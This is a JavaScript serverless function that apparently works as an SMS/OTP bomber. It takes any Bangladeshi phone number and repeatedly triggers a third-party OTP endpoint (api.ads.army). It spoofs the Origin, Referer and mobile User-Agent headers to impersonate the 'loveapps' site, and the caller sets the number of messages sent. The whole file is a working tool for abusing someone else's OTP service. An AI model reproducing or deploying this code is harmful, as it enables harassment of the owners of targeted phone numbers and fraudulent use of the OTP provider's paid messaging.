// love-guru.js
let otpCount = 0;

async function handleOTPRequest(event) {
  // For serverless environments like Vercel, event is the request object
  const url = new URL(event.request.url);
  const limit = parseInt(url.searchParams.get('limit') || 5); // Default limit to 5 if not provided
  const phone = url.searchParams.get('phone'); // Expect phone number as a query param

  // Validate phone number
  if (!phone || phone.length !== 11) {
    return new Response(
      JSON.stringify({ error: 'দয়া করে সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন।' }),
      { status: 400, headers: { 'Content-Type': 'application/json' } }
    );
  }

  // Prefix '88' to the phone number
  const fullPhoneNumber = '88' + phone;

  // Check if the limit exceeds
  if (otpCount >= limit) {
    return new Response(
      JSON.stringify({ error: 'OTP সীমা অতিক্রম করেছে!' }),
      { status: 429, headers: { 'Content-Type': 'application/json' } }
    );
  }

  const apiUrl = 'http://api.ads.army/otp/sendOTP';
  const data = {
    app: 'loveapps',
    msisdn: fullPhoneNumber,
    aditionalData: [
      { network: '1001', clickid: '880196110478746076', campaignid: '8837158' }
    ]
  };

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'Accept': '*/*',
        'Origin': 'http://loveapps.bd.gd',
        'Referer': 'http://loveapps.bd.gd/',
        'User-Agent':
          'Mozilla/5.0 (Linux; Android 11; helio 30 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.39 Mobile Safari/537.36'
      },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const result = await response.json();
    otpCount++;

    return new Response(
      JSON.stringify({
        message: 'OTP পাঠানো হয়েছে! মোট পাঠানো হয়েছে: ' + otpCount,
        data: result
      }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Error:', error);
    return new Response(
      JSON.stringify({ error: 'কিছু সমস্যা হয়েছে!' }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

// Export for Vercel serverless function
export default handleOTPRequest;
